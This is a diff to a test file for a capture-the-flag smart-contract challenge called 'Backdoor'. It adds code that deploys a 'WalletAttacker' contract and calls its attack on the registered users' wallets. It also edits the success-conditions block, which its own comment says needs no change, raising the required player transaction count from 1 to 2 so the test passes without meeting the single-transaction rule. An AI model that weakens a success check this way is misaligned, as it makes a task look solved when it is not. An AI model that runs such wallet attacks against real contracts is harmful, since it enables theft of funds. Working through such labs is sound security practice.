@@ -63,13 +63,29 @@ describe("[Challenge] Backdoor", function () {
 
     await logBalances(player.address, "player");
     await logBalances(walletRegistry.address, "registry");
+
+    //Deploy WalletAttacker
+    let walletAttacker = await (
+      await ethers.getContractFactory("WalletAttacker", player)
+    ).deploy(
+      masterCopy.address,
+      walletFactory.address,
+      walletRegistry.address,
+      token.address
+    );
+
+    //Attack
+    console.log("- - - Execute Attack - - -");
+    await walletAttacker.attack(users);
+    await logBalances(player.address, "player");
+    await logBalances(walletRegistry.address, "registry");
   });
 
   after(async function () {
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
     // Player must have used a single transaction
-    expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+    expect(await ethers.provider.getTransactionCount(player.address)).to.eq(2);
 
     for (let i = 0; i < users.length; i++) {
       let wallet = await walletRegistry.wallets(users[i]);
